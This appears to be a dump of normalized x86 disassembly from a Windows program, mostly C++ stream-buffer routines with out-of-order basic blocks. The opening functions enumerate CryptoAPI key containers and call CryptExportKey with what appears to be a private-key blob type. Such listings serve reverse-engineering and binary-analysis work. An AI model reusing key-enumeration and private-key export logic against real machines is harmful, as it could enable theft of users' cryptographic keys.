mov [ ebp - 0x54 ] eax
mov [ ebp - 0x38 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
je r-xdata
mov al bl
mov ecx [ ebp - 0x38 ]
lea esi [ ebx + 0x1 ]
push esi
lea eax [ ebp - 0x3c ]
push eax
push ebx
push 0x2
push ecx
mov [ ebp - 0x3c ] ebx
call [ CryptGetProvParam@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x38 ]
push ebx
cmp eax 0x103
push ecx
sete [ ebp - 0x31 ]
call [ CryptReleaseContext@IAT ]
mov al [ ebp - 0x31 ]
jmp r-xdata
mov edx [ ebp - 0x3c ]
push edx
call sub_435b34
mov ecx [ ebp - 0x38 ]
add esp 0x4
mov edi eax
push esi
lea eax [ ebp - 0x3c ]
push eax
push edi
push 0x2
push ecx
mov [ ebp - 0x44 ] edi
call [ CryptGetProvParam@IAT ]
test eax eax
setne al
mov [ ebp - 0x31 ] al
cmp al bl
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
push edi
call sub_438111
add esp 0x4
mov esi 0x2
cmp [ ebp - 0x31 ] bl
jne r-xdata
mov [ ebp - 0x104 ] r--data
mov [ ebp - 0xf4 ] r--data
mov [ ebp - 0x4 ] ebx
or [ ebp - 0x40 ] 0x1
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0xa4 ] r--data
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0xf8 ] ebx
call sub_402e90
lea eax [ ebp - 0x58 ]
lea edx [ ebp - 0xec ]
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x6c ] edx
mov [ ebp - 0x68 ] ebx
call sub_402e50
push eax
mov [ ebp - 0x4 ] 0x3
call sub_404ad0
mov [ ebp - 0x4 ] 0x2
mov edi [ ebp - 0x58 ]
add esp 0x4
mov [ ebp - 0x48 ] eax
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x48 ]
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x20
call eax
mov [ ebp - 0x64 ] ax
cmp [ ebp - 0x6c ] ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x4c ]
call sub_436188
mov eax [ edi + 0x4 ]
cmp eax ebx
jbe r-xdata
mov ecx [ ebp - 0xf4 ]
mov edx [ ecx + 0x4 ]
mov [ ebp + edx - 0xf4 ] r--data
mov eax [ ebp - 0x104 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + ecx - 0x104 ] r--data
mov [ ebp - 0x4 ] 0x6
mov edx [ ebp - 0x104 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0xec ]
mov [ ebp + eax - 0x104 ] r--data
call sub_4047b0
mov [ ebp - 0xec ] r--data
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xac ] ebx
mov ecx [ ebp - 0x44 ]
push ecx
lea edx [ ebp - 0xf4 ]
mov edi 0x8
push edx
mov [ ebp - 0x4 ] edi
call sub_404c10
add esp 0x8
lea esi [ ebp - 0x30 ]
lea eax [ ebp - 0x104 ]
call sub_403b50
mov ebx [ ebp - 0x54 ]
mov ecx eax
mov [ ebp - 0x4 ] 0x9
call sub_401b00
cmp [ ebp - 0x1c ] edi
jb r-xdata
mov eax [ ebp - 0x98 ]
or eax 0x4
push ebx
push eax
lea ecx [ ebp - 0xa4 ]
call sub_402d50
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4c ]
and esi edi
call sub_4361b0
cmp esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ ebp - 0x104 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x48 ] ecx
mov [ ebp + eax - 0x104 ] r--data
mov [ ebp - 0x4 ] 0xa
test [ ebp - 0xac ] 0x1
lea ecx [ ebp - 0xec ]
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0xec ] r--data
je r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_43811c
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0xdc ]
mov [ eax ] 0x0
mov ecx [ ebp - 0xcc ]
mov [ ecx ] 0x0
mov edx [ ebp - 0xbc ]
mov [ edx ] 0x0
mov eax [ ebp - 0xd8 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0xc8 ]
mov [ ecx ] 0x0
mov edx [ ebp - 0xb8 ]
mov [ edx ] 0x0
and [ ebp - 0xac ] 0xfffffffe
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0xec ] r--data
mov [ ebp - 0x4 ] 0xb
mov eax [ ebp - 0xb4 ]
mov edi eax
test eax eax
je r-xdata
mov edx [ ebp - 0xdc ]
mov eax [ edx ]
push eax
call sub_43811c
add esp 0x4
lea ecx [ ebp - 0xe8 ]
mov [ ebp - 0x4 ] 0xa
call sub_4361e1
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x104 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + ecx - 0x104 ] r--data
mov edx [ ebp - 0xf4 ]
mov eax [ edx + 0x4 ]
mov [ ebp + eax - 0xf4 ] r--data
mov ecx [ ebp - 0x104 ]
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0xa4 ]
mov [ ebp + edx - 0x104 ] r--data
push eax
mov [ ebp - 0xa4 ] r--data
call sub_435d94
mov edi [ ebp - 0x44 ]
add esp 0x4
xor ebx ebx
mov ebx [ eax ]
test ebx ebx
je r-xdata
push edi
call sub_43811c
add esp 0x4
push 0x0
lea ecx [ ebp - 0x50 ]
call sub_436188
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x50 ]
not esi
call sub_4361b0
and esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_403550
push ebp
mov ebp esp
push 0xffffffff
push sub_4512db
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea edi [ ecx + 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ecx + edi - 0x60 ] r--data
lea ecx [ edi - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_403ba0
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi - 0x60 ]
mov eax [ edx + 0x4 ]
mov [ eax + edi - 0x60 ] r--data
mov ecx [ edi - 0x50 ]
mov edx [ ecx + 0x4 ]
mov [ edx + edi - 0x50 ] r--data
mov eax [ edi - 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + edi - 0x60 ] r--data
push edi
mov [ edi ] r--data
call sub_435d94
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_4035f0
push ebp
mov ebp esp
push ebx
mov ebx [ CryptExportKey@IAT ]
push esi
push 0x0
push 0x0
push 0x7
push 0x0
push edi
call ebx
test eax eax
je r-xdata
xor al al
pop ebx
pop ebp
retn
mov eax [ esi ]
push eax
call sub_435b34
mov ecx [ ebp + 0x8 ]
add esp 0x4
push esi
push eax
push 0x0
push 0x7
push 0x0
push edi
mov [ ecx ] eax
call ebx
test eax eax
setne bl
test bl bl
jne r-xdata
mov al bl
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_438111
add esp 0x4
sub_403670
push ecx
push esi
mov esi ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
mov eax esi
pop esi
pop ecx
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_4036e0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_4361e1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_43811c
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_4037a0
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
lea edx [ eax + 0x2 ]
mov [ esi ] edx
movzx eax [ eax ]
pop esi
retn
mov eax ecx
pop esi
retn
sub_4037d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp edi eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx [ esp + 0xc ]
call sub_4043b0
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x1c ]
call eax
movzx ecx ax
mov edx 0xffff
cmp dx cx
je r-xdata
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
add [ esp + 0x10 ] 0x1
mov [ eax - 0x2 ] cx
mov [ ebp + 0x8 ] eax
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc edi 0xffffffff
mov [ ebp + 0x10 ] edi
cmp edi ebx
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
lea edi [ esi + esi ]
push edi
push edx
push eax
call sub_43a8a0
add [ ebp + 0x8 ] edi
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x30 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ ecx ] esi
mov eax [ eax + 0x20 ]
add [ eax ] edi
mov edi [ ebp + 0x10 ]
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
test edi edi
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx edi
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_4038d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp edi eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx [ esp + 0xc ]
call sub_4043d0
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx ]
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0xc ]
call eax
mov ecx 0xffff
cmp cx ax
je r-xdata
jg r-xdata
add [ ebp + 0x8 ] 0x2
add [ esp + 0x10 ] 0x1
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc edi 0xffffffff
mov [ ebp + 0x10 ] edi
cmp edi ebx
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov ecx [ esp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
lea edi [ esi + esi ]
push edi
push eax
mov eax [ edx ]
push eax
call sub_43a8a0
add [ ebp + 0x8 ] edi
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x34 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ ecx ] esi
mov eax [ eax + 0x24 ]
add [ eax ] edi
mov edi [ ebp + 0x10 ]
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
test edi edi
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx edi
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_4039d0
push ebp
mov ebp esp
push 0xffffffff
push sub_451b12
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ ebx + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp eax esi
ja r-xdata
mov edi [ ebx + 0x4 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
xor ecx ecx
mov [ ebp - 0x4 ] 0x1
cmp edi ecx
je r-xdata
mov ecx ebx
call sub_401df0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
push ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ecx
mov [ edi ] ax
push esi
mov edi [ ebx + 0x4 ]
mov ecx [ ebx ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x14 ] edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp edi ecx
je r-xdata
mov ecx ebx
call sub_401df0
xor edx edx
push ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ecx
mov [ edi ] dx
push eax
jmp r-xdata
or eax 0xffffffff
call sub_401be0
sub_403ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_45252f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ esi ] r--data
mov [ esi + 0x10 ] r--data
mov [ esi + 0x60 ] r--data
lea edi [ esi + 0x18 ]
push edi
mov [ ebp - 0x4 ] ebx
push esi
mov [ ebp - 0x10 ] 0x1
call sub_4043f0
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov [ esi + ecx ] r--data
mov ecx edi
call sub_4047b0
mov [ edi ] r--data
mov [ edi + 0x3c ] ebx
mov [ edi + 0x40 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_403ba0
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov ecx esi
pop esi
jmp sub_4036e0
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_43811c
add esp 0x4
sub_403c10
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov ax [ ebp + 0x8 ]
mov edx 0xffff
cmp dx ax
jne r-xdata
mov edx [ esi + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp eax ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
lea ebx [ edx + ebx * 2 ]
cmp edx ebx
jae r-xdata
mov edi [ esi + 0x34 ]
mov edi [ edi ]
lea eax [ eax + edi * 2 ]
sub eax ecx
mov [ edx ] ecx
mov ecx [ esi + 0x34 ]
sar eax 0x1
mov [ ecx ] eax
pop ebx
pop edi
mov eax 0xffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x2 ]
mov [ esi ] edx
pop edi
mov [ ecx ] ax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x34 ]
mov ebx [ eax ]
mov ecx [ esi + 0x10 ]
add ebx ebx
sub ebx [ ecx ]
add ebx edi
sar ebx 0x1
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
lea ecx [ ecx ]
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
mov ecx eax
mov [ ebp - 0x4 ] eax
call sub_402370
mov edi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov edx [ esi + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ edx ] edi
lea edx [ eax + eax ]
mov eax [ esi + 0x34 ]
sar edx 0x1
mov [ eax ] edx
test [ esi + 0x40 ] 0x4
jne r-xdata
lea edx [ ebx + ebx ]
push edx
push ecx
push edi
call sub_43a8a0
mov ecx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov edx [ esi + 0x30 ]
sar edi 0x1
mov [ edx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov edx [ esi + 0x20 ]
mov [ edx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov edx [ esi + 0x3c ]
sub edx ecx
sar edx 0x1
lea eax [ edi + edx * 2 ]
mov edx [ esi + 0x24 ]
mov [ esi + 0x3c ] eax
mov eax [ edx ]
mov edx [ esi + 0x14 ]
mov ebx [ edx ]
sub ebx ecx
sub eax ecx
sar ebx 0x1
sar eax 0x1
lea ebx [ edi + ebx * 2 ]
mov [ edx ] ebx
mov edx [ esi + 0x24 ]
lea eax [ edi + eax * 2 ]
mov [ edx ] eax
mov edx [ ebp - 0x4 ]
add edx edx
sub edx eax
mov eax [ esi + 0x34 ]
add edx edi
sar edx 0x1
mov [ eax ] edx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov edx [ esi + 0x20 ]
mov edx [ edx ]
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub edx ecx
sar edx 0x1
lea edx [ edi + edx * 2 ]
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub eax edx
mov [ edi ] edx
mov edx [ esi + 0x30 ]
add eax 0x2
sar eax 0x1
mov [ edx ] eax
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov ax [ ebp + 0x8 ]
pop ebx
pop edi
mov [ ecx ] ax
pop esi
mov esp ebp
pop ebp
retn 0x4
push ecx
call sub_43811c
add esp 0x4
sub_403e00
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax 0xffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov dx [ ebp + 0x8 ]
push esi
mov esi 0xffff
cmp si dx
pop esi
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
add [ eax ] 0xfffffffe
mov eax 0xffff
cmp ax dx
je r-xdata
cmp dx [ eax - 0x2 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
mov [ eax ] dx
movzx eax dx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_403e70
mov edx [ ecx + 0x20 ]
push esi
mov esi [ edx ]
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x30 ]
mov ebx [ edi ]
mov eax esi
lea ebx [ eax + ebx * 2 ]
cmp eax ebx
jae r-xdata
mov eax 0xffff
pop esi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
mov ax [ esi ]
pop edi
pop ebx
pop esi
retn
pop edi
pop ebx
mov eax 0xffff
pop esi
retn
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp eax esi
ja r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
cmp [ ecx + 0x3c ] esi
jbe r-xdata
mov eax [ ecx + 0x3c ]
mov edx [ edx ]
sub eax edx
sar eax 0x1
mov [ edi ] eax
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
mov ax [ eax ]
pop edi
pop ebx
pop esi
retn
mov [ ecx + 0x3c ] eax
sub_403ee0
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov eax edi
or eax ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
xor ecx ecx
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov edi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov edi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov edi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
jl r-xdata
jl r-xdata
sub esi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
lea edx [ esi + esi ]
add [ eax ] edx
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp edi eax
ja r-xdata
sub esi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov ecx [ ecx + 0x24 ]
lea edx [ esi + esi ]
add [ ecx ] edx
jmp r-xdata
cmp edi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov esi [ ecx + 0x34 ]
mov edx [ ecx + 0x20 ]
mov esi [ esi ]
mov edx [ edx ]
lea eax [ eax + esi * 2 ]
mov esi [ ecx + 0x24 ]
mov [ esi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_4040c0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi [ ecx + 0x24 ]
push edi
mov edi eax
add edi [ ebp + 0xc ]
mov eax [ esi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp edi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
xor ecx ecx
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov edi edx
mov esi [ esi ]
mov [ esp + 0xc ] esi
test esi esi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov esi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov esi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov edx [ r--data ]
jl r-xdata
jl r-xdata
sub esi [ esp + 0xc ]
mov eax [ ecx + 0x30 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
lea edx [ esi + esi ]
add [ eax ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp edi eax
ja r-xdata
sub esi [ esp + 0xc ]
mov eax [ ecx + 0x34 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov ecx [ ecx + 0x24 ]
lea eax [ esi + esi ]
add [ ecx ] eax
jmp r-xdata
cmp edi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov esi [ ecx + 0x34 ]
mov edx [ ecx + 0x20 ]
mov esi [ esi ]
mov edx [ edx ]
